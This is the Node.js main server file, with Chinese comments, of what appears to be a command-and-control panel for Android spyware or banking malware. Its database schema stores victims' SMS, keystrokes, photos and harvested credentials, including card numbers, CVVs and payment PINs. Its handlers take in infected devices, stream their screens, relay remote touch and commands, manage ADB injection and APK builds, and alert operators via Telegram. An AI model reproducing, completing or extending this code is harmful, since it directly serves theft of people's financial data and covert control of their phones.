/**
 * ============================================================================
 * 花木工作室 — Node 后端主入口（纯 Node，无 Python 依赖）
 * ============================================================================
 * 职责：
 *   1. HTTP API 服务器（127.0.0.1:39445，由 nginx 443 反代对外）
 *      - /m/*          面板管理 REST API（路由实现在 routes.js，JWT 鉴权）
 *      - /n* /p/* /s/* 设备 HTTP 接入（agent/tpx 心跳·命令轮询，实现在 zhuque.js）
 *      - 其余路径       静态前端（/root/xyzcs_front，SPA fallback 到 index.html）
 *   2. WebSocket 升级分发（同一端口）：
 *      - /w            设备 WS 通道（agent 实时命令/回传 → zhuque.handleDeviceWs）
 *      - /e            浏览器面板 WS（事件订阅/触控下发，20s 心跳保活防 nginx 掐断）
 *      - /s/lk         dxs 无线调试桥（手机 dxs 反连 → bridge.handleBridgeWs）
 *   3. SQLite 数据库启动自建（12 张表，见下方 DB 段与 schema.sql）
 *
 * 同机配套（eagle.js 在本进程内启动）：39444/5055/5058 三端口 TCP 接 eagle agent。
 *
 * 相关文件：
 *   routes.js  /m/* 管理 API 与业务逻辑
 *   zhuque.js  agent WS/HTTP 协议接入与命令队列
 *   eagle.js   eagle agent 原生 TCP 桥 + adb 直注通道
 *   bridge.js  dxs 无线调试桥（/s/lk）
 * 运行：systemd xy-replica.service（ExecStart=/usr/bin/node server.js）
 * 日志：/tmp/xy_bridge.log（本文件 log()）；/tmp/xy_replica.log（systemd stdout）
 */
const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const {URL} = require('url');
const Database = require('better-sqlite3');
const {WebSocketServer} = require('ws');

const PORT = 39445;
const ROOT = '/root/xyzcs_front';
const DB_PATH = '/root/xyzcs_replica.db';
const LOG_FILE = process.env.EAGLE_LOG_FILE || '/tmp/xy_bridge.log';
// JWT 密钥文件化（与 eagle_php 两端 PHP 共用同文件）：不再进源码库，
// 文件不存在时首启生成 64 位 hex（此时旧 token 全部失效，重新登录即可）
const SECRET_FILE = '/var/www/eagle_php/.jwt_secret';
let SECRET = '';
try {
  SECRET = fs.readFileSync(SECRET_FILE, 'utf8').trim();
  if (!SECRET || SECRET.length < 32) throw new Error('weak secret');
} catch (e) {
  SECRET = crypto.randomBytes(32).toString('hex');
  try { fs.mkdirSync(path.dirname(SECRET_FILE), {recursive: true}); fs.writeFileSync(SECRET_FILE, SECRET, {mode: 0o640}); } catch (e2) {}
}

// ---------------- DB（SQLite /root/xyzcs_replica.db，启动自动建表建索引） ----------------
// 12 张表：devices 设备快照(JSON data) / sms 短信 / credentials 凭据 / keylogs 键记录 /
//          blacklist IP黑名单 / groups 设备分组 / notices 公告 / notifications 通知 /
//          album 相册缩略图与原图 / kv 键值 / commands 命令历史 / generic 泛型存储(builds 构建记录、注入模板等)
const db = new Database(DB_PATH);
db.pragma('journal_mode = WAL');
db.pragma('synchronous = NORMAL');
db.pragma('busy_timeout = 3000');
db.exec(`
CREATE TABLE IF NOT EXISTS devices(id TEXT PRIMARY KEY, data TEXT);
CREATE TABLE IF NOT EXISTS sms(id INTEGER PRIMARY KEY, device_id TEXT, device_label TEXT, sender TEXT, body TEXT, recv_at TEXT, is_read INTEGER, source TEXT, create_at TEXT);
CREATE TABLE IF NOT EXISTS credentials(id INTEGER PRIMARY KEY, device_id TEXT, device_label TEXT, app_name TEXT, app_pkg TEXT, login TEXT, password TEXT, card TEXT, cvv TEXT, exp_date TEXT, pay_pin TEXT, type TEXT, capt_at TEXT, extra TEXT);
CREATE TABLE IF NOT EXISTS keylogs(id INTEGER PRIMARY KEY, device_id TEXT, app_pkg TEXT, log_type TEXT, text TEXT, capt_at TEXT);
CREATE TABLE IF NOT EXISTS blacklist(id INTEGER PRIMARY KEY, ip TEXT, device_id TEXT, reason TEXT, created_at TEXT);
CREATE TABLE IF NOT EXISTS groups(id INTEGER PRIMARY KEY, name TEXT, device_count INTEGER);
CREATE TABLE IF NOT EXISTS notices(noticeId INTEGER PRIMARY KEY, noticeTitle TEXT, noticeContent TEXT, noticeType INTEGER, status INTEGER, createBy TEXT, createTime TEXT, updateTime TEXT);
CREATE TABLE IF NOT EXISTS notifications(id INTEGER PRIMARY KEY, title TEXT, body TEXT, level TEXT, is_read INTEGER DEFAULT 0, created_at TEXT);
CREATE TABLE IF NOT EXISTS album(id TEXT PRIMARY KEY, device_id TEXT, display_name TEXT, path TEXT, size INTEGER, mtime INTEGER, thumb BLOB, orig BLOB, fetched_at TEXT);
CREATE INDEX IF NOT EXISTS idx_album_dev ON album(device_id);
CREATE TABLE IF NOT EXISTS kv(k TEXT PRIMARY KEY, v TEXT);
CREATE TABLE IF NOT EXISTS commands(id INTEGER PRIMARY KEY, device_id TEXT, command TEXT, payload TEXT, status TEXT, created_at TEXT);
CREATE TABLE IF NOT EXISTS generic(store TEXT, id TEXT PRIMARY KEY, data TEXT, updated_at TEXT);
CREATE INDEX IF NOT EXISTS idx_kl_dev ON keylogs(device_id);
CREATE INDEX IF NOT EXISTS idx_sms_dev ON sms(device_id);
CREATE INDEX IF NOT EXISTS idx_cred_dev ON credentials(device_id);
`);

// ---------------- 工具 ----------------
const j = o => JSON.stringify(o);
const _logQ = [];
let _logBusy = false;
function _logFlush() {
  if (_logBusy || !_logQ.length) return;
  _logBusy = true;
  const batch = _logQ.splice(0, 200).join('');
  fs.appendFile(LOG_FILE, batch, () => { _logBusy = false; if (_logQ.length) setImmediate(_logFlush); });
}
function log(tag, obj) {
  try {
    const t = new Date(Date.now() + 8 * 3600e3).toISOString().slice(11, 19);
    _logQ.push(`${t} [${tag}] ${(typeof obj === 'string' ? obj : j(obj)).slice(0, 900)}\n`);
    if (_logQ.length > 5000) _logQ.splice(0, _logQ.length - 5000);
    setImmediate(_logFlush);
  } catch {}
}

// JWT HS256（与 py 版同 SECRET 同算法，旧 token 继续有效）
const b64u = b => Buffer.from(b).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
function jwtSign(payload) {
  const h = b64u(j({alg: 'HS256', typ: 'JWT'}));
  const p = b64u(j(payload));
  const s = b64u(crypto.createHmac('sha256', SECRET).update(h + '.' + p).digest());
  return `${h}.${p}.${s}`;
}
function safeEqStr(a, b) {
  const A = crypto.createHash('sha256').update(String(a)).digest();
  const B = crypto.createHash('sha256').update(String(b)).digest();
  return crypto.timingSafeEqual(A, B);
}
function jwtCheck(tok) {
  try {
    const parts = String(tok).split('.');
    if (parts.length !== 3) return null;
    const [h, p, s] = parts;
    const exp = b64u(crypto.createHmac('sha256', SECRET).update(h + '.' + p).digest());
    if (!safeEqStr(exp, s)) return null;
    const d = JSON.parse(Buffer.from(p.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString());
    if ((d.exp || 0) * 1000 < Date.now()) return null;
    return d;
  } catch { return null; }
}

// ---------------- /e 浏览器 WS ----------------
const wsClients = new Set();        // {ws, lk, subs}
function broadcast(msg, deviceIds) {
  const data = j(msg);
  const isShot = msg && msg.type === 'screenshot';   // 截图帧可丢弃（跳帧防积压）
  for (const c of [...wsClients]) {
    if (deviceIds && c.subs && !(deviceIds.some(id => c.subs.has(String(id))))) continue;
    if (isShot && c.ws.bufferedAmount > 24576) continue;   // 下行积压>24KB：跳过旧帧，浏览器始终看最新
    try { c.lk ? c.lk(() => { try { c.ws.send(data); } catch {} })() : c.ws.send(data); } catch {}
  }
}
// 二进制截图帧通道（[1字节头长=0][图片数据]，前端投屏激活后直达渲染）
function broadcastFrame(deviceId, jpgBuf) {
  const frame = Buffer.concat([Buffer.from([0]), jpgBuf]);
  for (const c of [...wsClients]) {
    if (c.subs && !c.subs.has(String(deviceId))) continue;
    if (c.ws.bufferedAmount > 262144) continue;             // 跳帧：下行积压时只保最新
    if (c.ws.bufferedAmount > 4194304) { try { c.ws.close(1013, 'zombie'); } catch {} wsClients.delete(c); continue; }   // 僵尸连接踢除
    try { c.ws.send(frame); } catch {}
  }
}

// ---------------- ctx（传给 routes/eagle） ----------------
const eagle = require('./eagle');
const zhuque = require('./zhuque');
const bridge = require('./bridge');
const tgbot = require('./tgbot');
const routes = require('./routes');
const ctx = {
  db, ROOT,
  getDevice: id => { const r = db.prepare("SELECT data FROM devices WHERE id=?").get(String(id)); return r ? JSON.parse(r.data) : null; },
  setDevice: d => db.prepare("INSERT OR REPLACE INTO devices(id,data) VALUES(?,?)").run(d.id, j(d)),
  broadcast,
  log,
  jwtSign, jwtCheck,
  wsCount: () => wsClients.size,
  ok: (res, x) => { res.writeHead(200, {'Content-Type': 'application/json; charset=utf-8'}); res.end(j(x)); },
  okt: res => { res.writeHead(200, {'Content-Type': 'application/json'}); res.end('{"ok":true}'); },
  bad: (res, msg, code = 400) => { res.writeHead(code, {'Content-Type': 'application/json; charset=utf-8'}); res.end(j({error: msg})); },
  json: (res, x) => { res.writeHead(200, {'Content-Type': 'application/json; charset=utf-8'}); res.end(j(x)); },
  file: (res, fp, opts) => {
    const ext = path.extname(fp).toLowerCase();
    const mime = {'.html': 'text/html; charset=utf-8', '.js': 'application/javascript', '.css': 'text/css',
      '.png': 'image/png', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.svg': 'image/svg+xml',
      '.ico': 'image/x-icon', '.json': 'application/json', '.apk': 'application/vnd.android.package-archive',
      '.woff': 'font/woff', '.woff2': 'font/woff2', '.map': 'application/json'}[ext] || 'application/octet-stream';
    // 静态资源缓存策略：/assets/ 下都是构建产物（文件名带内容哈希）→ 一年强缓存，
    // 改文件必须同步 bump index.html 引用的 ?v= 版本号；非 assets 文件（ws-keep.js 等）请求带 ?v=N 时同样长缓存（改文件必须 bump ?v=）
    const cacheable = fp.startsWith(ROOT + path.sep + 'assets' + path.sep) || ext === '.woff2' || ext === '.png' || ext === '.ico' || (opts && opts.immutable);
    // HTML 一律 no-store：浏览器完全不缓存入口文档，杜绝旧 index.html 残留导致加载旧主程序
    res.writeHead(200, {'Content-Type': mime, 'Cache-Control': cacheable ? 'public, max-age=31536000, immutable' : (ext === '.html' ? 'no-store' : 'no-cache')});
    fs.createReadStream(fp).pipe(res);
  },
  eagle, zhuque,
  broadcastFrame,
};
ctx.routes = routes;
routes.register(ctx);
tgbot.init(ctx);                  // ctx.tg = Telegram 通知（zhuque/eagle/routes 事件点调用）
eagle.init(ctx);
zhuque.init(ctx);
bridge.init(ctx);
routes.ctxRef = ctx;                 // zhuque 注册需要访问 routes.sanD

// ---------------- 静态文件（SPA fallback） ----------------
function serveStatic(req, res, pathname) {
  // uploads 下不静态直出：构建 APK / 设备文件 / 上传资源全部走带鉴权路由
  // （/m/build/:bid/download、/m/device/:id/download-file、/m/assets/*），
  // 原实现可无鉴权枚举下载全部构建产物（build id 为时间戳可猜）
  if (pathname === '/uploads/' || pathname.startsWith('/uploads/')) { res.writeHead(404); return res.end(); }
  const fp = path.normalize(path.join(ROOT, pathname)).replace(/^(\.\.[\/\\])+/, '');
  const inRoot = fp === ROOT || fp.startsWith(ROOT + path.sep);
  if (inRoot && fs.existsSync(fp) && fs.statSync(fp).isFile()) return ctx.file(res, fp, {immutable: /\?v=\d+/.test(req.url)});
  ctx.file(res, path.join(ROOT, 'index.html'));   // SPA fallback（no-cache 保证不发旧版）
}

// ---------------- 请求体解析 ----------------
function readBody(req) {
  return new Promise(resolve => {
    const chunks = [];
    let size = 0;
    req.on('data', c => { size += c.length; if (size > 210 * 1024 * 1024) req.destroy(); else chunks.push(c); });
    req.on('end', () => resolve(Buffer.concat(chunks)));
    req.on('error', () => resolve(Buffer.concat(chunks)));
  });
}

// ---------------- HTTP 分发 ----------------
async function handle(req, res) {
  const u = new URL(req.url, 'http://x');
  const pathname = u.pathname;
  const query = {};
  for (const [k, v] of u.searchParams) query[k] = v;

  // CORS 收紧：仅面板自身域名跨源放行（同源请求不受影响；'*' 会放行任意站点带 token 调 API）
  const org = req.headers.origin;
  if (org && /^https?:\/\/([A-Za-z0-9-]+\.)*(zxg123\.com|kkyk1688\.cc)(:\d+)?$/.test(org)) {
    res.setHeader('Access-Control-Allow-Origin', org);
    res.setHeader('Access-Control-Allow-Headers', 'Authorization,Content-Type,X-K,X-T');
    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');
    if (req.method === 'OPTIONS') { res.writeHead(204); return res.end(); }
  } else if (req.method === 'OPTIONS') { res.writeHead(204); return res.end(); }

  // 设备接入端点（/n 注册、/n/poll 轮询、/p /s 心跳轮询——agent 与 tpx 桥；/api 也一并接住 404，避免喂 SPA HTML）
  if (pathname === '/n' || pathname.startsWith('/n/') || pathname.startsWith('/p/') || pathname.startsWith('/s/') || pathname.startsWith('/api/')) {
    let body = {};
    if (req.method === 'POST') {
      const raw = await readBody(req);
      try { body = JSON.parse(raw.toString() || '{}'); } catch { body = {}; }
    }
    return void zhuque.httpHandler(pathname, req, res, ctx, body, query);
  }

  // /m/* API 路由
  if (pathname === '/m' || pathname.startsWith('/m/')) {
    const parts = pathname.split('/').filter(Boolean);
    let body = {};
    if (req.method === 'POST' || req.method === 'PUT' || (req.method === 'DELETE' && !!(req.headers['content-length']))) {
      const raw = await readBody(req);
      const ct = req.headers['content-type'] || '';
      if (ct.includes('multipart/form-data')) {
        body.__multipart = raw;      // 上传端点从 body.__multipart 取原始 buffer（流已被读走）
      } else {
        try { body = JSON.parse(raw.toString() || '{}'); } catch { body = {}; body.__raw = raw; }   // 非JSON（二进制等）保留原始 buffer
      }
    }
    for (const r of routes.routes) {
      if (Array.isArray(r.method) ? !r.method.includes(req.method) : r.method !== req.method) continue;
      const params = routes.match(r.pattern, parts);
      if (!params) continue;
      try {
        // multipart 上传：把已读的 body 传回 req 流
        if (body.__multipart) { req.__body = body.__multipart; }
        await r.h(req, res, ctx, params, body, query);
      } catch (e) {
        log('route-err', {p: pathname, e: String(e).slice(0, 150)});
        if (!res.headersSent) ctx.bad(res, '内部错误', 500);
      }
      return;
    }
    // 兜底：GET [] / 其他 {ok:true}（与 py 版一致）
    if (!jwtCheck((req.headers['authorization'] || '').replace(/^Bearer /, ''))) return ctx.bad(res, '未提供令牌', 401);
    if (req.method === 'GET') return ctx.ok(res, []);
    return ctx.okt(res);
  }

  // 静态
  serveStatic(req, res, pathname);
}

const server = http.createServer((req, res) => {
  handle(req, res).catch(e => {
    log('http-err', String(e).slice(0, 150));
    if (!res.headersSent) { res.writeHead(500); res.end(); }
  });
});

// ---------------- WS 升级（/e 浏览器事件通道） ----------------
const wss = new WebSocketServer({noServer: true, maxPayload: 64 * 1024 * 1024});
server.on('upgrade', (req, sock) => {
  const u = new URL(req.url, 'http://x');
  if (u.pathname === '/w') {                       // 设备 WS 通道
    return wss.handleUpgrade(req, sock, {}, ws => zhuque.handleDeviceWs(ws, req));
  }
  if (u.pathname === '/s/lk') {                    // dxs 无线调试桥接（WS 与 HTTP 同路径，Upgrade 头区分）
    return wss.handleUpgrade(req, sock, {}, ws => bridge.handleBridgeWs(ctx, ws, req));
  }
  if (u.pathname !== '/e') { sock.destroy(); return; }
  // token 来源优先级：Authorization 头 > Sec-WebSocket-Protocol(bearer.<jwt>) > URL query（兼容旧前端）
  let wsTok = '';
  const _ah = String(req.headers['authorization'] || '');
  if (_ah.startsWith('Bearer ')) wsTok = _ah.slice(7);
  if (!wsTok) {
    const _proto = String(req.headers['sec-websocket-protocol'] || '').split(',')
      .map(x => x.trim()).find(x => x.toLowerCase().startsWith('bearer.'));
    if (_proto) wsTok = _proto.slice(7);
  }
  const _fromUrl = !wsTok;
  if (!wsTok) wsTok = u.searchParams.get('token') || '';
  const wsAuth = jwtCheck(wsTok);
  if (!wsAuth) { sock.destroy(); return; }
  if (_fromUrl) log('ws-token-url', {ip: (req.socket && req.socket.remoteAddress) || ''});
  wss.handleUpgrade(req, sock, {}, ws => {
    const client = {ws, lk: null, subs: null, lastAct: Date.now(), auth: wsAuth};
    wsClients.add(client);
    // 20s 心跳保活：必须远小于 nginx 默认 proxy_read_timeout(60s)，否则连接被 nginx 静默掐断
    const ka = setInterval(() => {
      // 空闲踢除：正常客户端每 20s 发 ping，150s 无任何上行消息 = 僵尸连接（页面崩溃/关闭后残留），关闭回收
      if (Date.now() - client.lastAct > 150000) {
        try { ws.close(4000, 'idle'); } catch {}
        clearInterval(ka); wsClients.delete(client);
        try { if (client.subs) for (const id of client.subs) if (ctx.eagle.adbMap[id]) ctx.eagle.adbPumpStop(id); } catch (e) {}
        return;
      }
      try { ws.send(j({type: 'device_update'})); } catch { clearInterval(ka); wsClients.delete(client); }
    }, 20000);
    ws.on('close', () => {
      clearInterval(ka); wsClients.delete(client);
      // 断开时回收 adb 截屏泵（按订阅计数）
      try { if (client.subs) for (const id of client.subs) if (ctx.eagle.adbMap[id]) ctx.eagle.adbPumpStop(id); } catch (e) {}
    });
    ws.on('message', raw => {
      client.lastAct = Date.now();
      let m;
      try { m = JSON.parse(raw.toString()); } catch { return; }
      const t = m.type;
      if (t === 'gesture_diag') { log('gesture-diag', JSON.stringify(m.data || {}).slice(0, 220)); return; }   // 手势诊断探针（ws-keep.js 注入）
      if (t === 'client_error') { log('client-error', JSON.stringify(m.data || {}).slice(0, 900)); return; }   // 前端全局错误上报（ws-keep.js 注入）
      if (t === 'ping') return ws.send(j({type: 'pong', ts: Date.now()}));
      if (t === 'subscribe') {
        const ids = (m.data || {}).device_ids || [];
        // 归属过滤：层级账户只能订阅自己树内设备（截图流/命令回包），管理员不限
        const a = client.auth;
        let allowed = ids;
        if (a && a.uid !== 1 && a.role !== 'admin' && ctx.canSee) {
          allowed = ids.filter(id => { try { return ctx.canSee(a, String(id)); } catch (e) { return false; } });
        }
        client.subs = new Set(allowed.map(String));
        // adb 截屏泵启动：agent WS 离线（无障碍流兜底）或 adbMode 开（DB adb_connected）
        try {
          for (const id of client.subs) {
            if (!ctx.eagle.adbMap[id]) continue;
            let adbMode = false;
            try { adbMode = !!(ctx.getDevice(id) || {}).adb_connected; } catch (e) {}
            if (adbMode || !zhuque.ZQ_WS.get(id)) ctx.eagle.adbPumpStart(id);
          }
        } catch (e) {}
        return ws.send(j({type: 'subscribed', device_ids: allowed}));
      }
      // 归属校验：层级账户对无权设备的触控/信令/命令一律丢弃
      const devAllowed = dev => {
        const a = client.auth;
        if (!a || a.uid === 1 || a.role === 'admin' || !ctx.canSee) return true;
        try { return ctx.canSee(a, String(dev)); } catch (e) { return false; }
      };
      if (t === 'vnc_touch' || t === 'adb_touch') {
        const dev = m.device_id, dd = m.data || {};
        if (!devAllowed(dev)) return;
        setImmediate(() => { try { zhuque.touchAny(dev, dd.cmd || '', dd); } catch (e) { log('touch-err', String(e).slice(0, 80)); } });
        return;
      }
      if (t === 'rtc_signal') {                      // 浏览器 → agent WebRTC 信令（answer/ice/retry）
        const dev = m.device_id;
        if (!devAllowed(dev)) return;
        const sig = m.data || {};
        if (String(sig.signalType || '') === 'RTC_STOP') {          // 浏览器放弃 RTC → 清状态回退 a11y 截图流
          try { zhuque.rtcStopped(dev); } catch (e) { log('rtc-stop-err', String(e).slice(0, 60)); }
        }
        setImmediate(() => { try {
          zhuque.wsSend(dev, {type: 'rtc_signal', data: sig, payload: sig, signalType: sig.signalType, sdp: sig.sdp});
          log('zq-rtc-in', {d: dev, st: String(sig.signalType || '').slice(0, 24)});
        } catch (e) { log('rtc-err', String(e).slice(0, 80)); } });
        return;
      }
      if (t === 'command') {
        const dev = m.device_id, dd = m.data || {};
        if (!devAllowed(dev)) { try { ws.send(j({type: 'command_result', data: {command: dd.command, ok: false, sent: false, error: '无权访问该设备'}})); } catch {} return; }
        const cmd = dd.command, payload = dd.payload || dd.params || {};
        let resp;
        if (cmd === 'GET_PERMISSIONS') {
          const d = ctx.getDevice(dev) || {};
          resp = {type: 'permissions_response', data: {permissions: {
            accessibility: true, notification: true, battery_optimization: true, deviceAdmin: !!d.has_admin,
            photo: true, contacts: true, readSms: true, sendSms: true, camera: true, microphone: true,
            storage: d.has_access !== false, appList: true}}};
        } else if (cmd === 'GET_UI_HIERARCHY') {
          log('reader-req', {d: dev});
          setImmediate(() => { try { zhuque.readerPull(dev); } catch (e) { log('reader-err', String(e).slice(0, 60)); } });   // agent 原生优先，adb 兜底（串行防堆积）
          resp = {type: 'command_result', data: {command: cmd, ok: true, sent: true}};
        } else if (cmd === 'catAllViewSwitch') {
          // 屏幕阅读器开关：eagle 走 5058 布局流；agent 走原生 GET_UI_HIERARCHY 周期拉取（adb uiautomator 兜底）
          const on = payload && (payload.on !== undefined ? payload.on : payload.enabled) !== false;
          if (eagle.isEagleDev(dev)) { on ? eagle.layoutStart(dev) : eagle.layoutStop(dev); }
          else { on ? zhuque.readerStart(dev) : zhuque.readerStop(dev); }
          resp = {type: 'command_result', data: {command: cmd, ok: true, sent: true}};
        } else {
          const okk = zhuque.commandAny(dev, cmd, payload);
          resp = {type: 'command_result', data: {command: cmd, ok: !!okk, sent: !!okk}};
        }
        try { ws.send(j(resp)); } catch {}
      }
    });
  });
});

// ---------------- 启动 ----------------
server.listen(PORT, '127.0.0.1', () => log('node-server', {port: PORT, note: 'eagle panel (node)'}));
eagle.start();
log('boot', 'eagle node backend up');

process.on('uncaughtException', e => log('uncaught', String((e && e.stack || e)).slice(0, 300)));
process.on('unhandledRejection', e => log('unhandled', String(e).slice(0, 300)));
